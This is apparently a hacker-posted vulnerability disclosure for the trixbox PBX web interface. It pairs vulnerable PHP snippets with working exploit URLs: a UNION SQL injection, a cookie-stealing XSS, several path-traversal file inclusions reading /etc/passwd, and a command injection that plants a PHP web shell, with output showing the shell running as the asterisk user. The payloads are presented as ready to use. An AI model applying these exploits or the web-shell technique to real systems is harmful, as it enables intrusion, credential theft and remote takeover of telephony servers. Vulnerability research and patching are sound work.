===================================================================

####################################################################
.:. Author         : AtT4CKxT3rR0r1ST
.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
.:. Home           : http://www.iphobos.com/blog/
.:. Script         : http://www.trixbox.com/
####################################################################

[1] Sql Injection
===================
VULNERABILITY
##############
[I] /var/www/html/maint/modules/endpointcfg/endpoint_generic.php

Line 79-99:
    case &#039;Submit&#039;:
        $message = "";
        $phone_vars[&#039;mac_address&#039;] = cleanMAC($phone_vars[&#039;mac_address&#039;]);
{$message = "MAC is invalid";}
        if ($phone_vars[&#039;freepbx_device&#039;]!="NONE") {  //get list of devices
from FreePBX
            $phone_vars = PopulateFromFreepbx($phone_vars);
        }
        else
        {
        $phone_vars[&#039;phone_label&#039;] =
$MACTABLE[substr($phone_vars[&#039;mac_address&#039;],0,6)][&#039;vendor&#039;];

        }

        if ($_REQUEST[&#039;mac&#039;]){ // if there is an ID then edit an existing
phone
        $querytxt = "UPDATE Generic SET ";
        foreach ($phone_vars as $key => $value) {
         $querytxt .= $key. " = &#039;" .trim($value). "&#039;,";
        }
        $querytxt .= "EditDate = NOW() WHERE mac_address=&#039;" .
$_REQUEST[&#039;mac&#039;]."&#039;";
        $error = getSQL($querytxt,&#039;endpoints&#039;);
          }

#########
EXPLOIT
#########

Http://IP/maint/modules/endpointcfg/endpoint_generic.php?action=Submit&mac=1&#039;
and 1=2 union select 1,2,3,4,5,6-- -

[2] Cross Site Scripting
===========================
VULNERABILITY
##############
[I] /var/www/html/user/help/html/index.php

Line 44:
                       $smarty->assign("id_nodo", $_GET[&#039;id_nodo&#039;]);

#########
EXPLOIT
#########

Http://IP/user/help/html/index.php?id_nodo="
onmouseover%3dprompt(document.cookie) bad%3d"


[3] Multiple Local File Include
=================================
VULNERABILITY
##############
[I] /var/www/html/maint/modules/home/index.php

Line 68-72:

$tbLang = $_GET[&#039;lang&#039;];
$languageFile = &#039;language/&#039;.$tbLang.&#039;.php&#039;;
if(file_exists($languageFile)){
    include($languageFile);
}

#########
EXPLOIT
#########

Http://IP/maint/modules/home/index.php?lang=../../../../../../../../etc/passwd%00

VULNERABILITY
##############
[II] /var/www/html/maint/modules/asterisk_info/asterisk_info.php

Line 17-25:

if(!empty($_GET[&#039;lang&#039;]) && isset($_GET[&#039;lang&#039;])){
    $tbLang = $_GET[&#039;lang&#039;];
}else{
    $tbLang = &#039;english&#039;;
}
$languageFile = &#039;language/&#039;.$tbLang.&#039;.php&#039;;
if(file_exists($languageFile)){
    include($languageFile);
}

#########
EXPLOIT
#########
Http://IP/maint/modules/asterisk_info/asterisk_info.php?lang=../../../../../../../../etc/passwd%00

VULNERABILITY
##############
[III] /var/www/html/maint/modules/repo/repo.php

Line 9-13:

$tbLang = $_GET[&#039;lang&#039;];
$languageFile = &#039;language/&#039;.$tbLang.&#039;.php&#039;;
if(file_exists($languageFile)){
    include($languageFile);
}

#########
EXPLOIT
#########
Http://IP/maint/modules/repo/repo.php?lang=../../../../../../../../etc/passwd%00

VULNERABILITY
##############
[V] /var/www/html/maint/modules/endpointcfg/endpointcfg.php

Line 29-33:

if(!empty($_GET[&#039;lang&#039;]) && isset($_GET[&#039;lang&#039;])){
    $languageFile = includeLanguage($_GET[&#039;lang&#039;]);
    include($languageFile);
    $tbLang = $_GET[&#039;lang&#039;];
}else{

#########
EXPLOIT
#########
Http://IP/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00

[4] Remote Code Execution
===========================
VULNERABILITY
##############
[I] /var/www/html/maint/modules/home/index.php

Line 339:

    $phpOutput = shell_exec(&#039;php -q libs/status.php &#039;.$tbLang);//exec(&#039;perl
libs/status.pl&#039;);

Line 68:

    $tbLang = $_GET[&#039;lang&#039;];

#########
EXPLOIT
#########

Http://IP/maint/modules/home/index.php?lang=MF;echo "<?php
system(\$_GET[&#039;cmd&#039;]);?> \$Greats 2 MY=\"Love:D">shell.php

Your Shell

Http://IP/maint/modules/home/shell.php?cmd=id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) $Greats 2
MY="Love:D
####################################################################

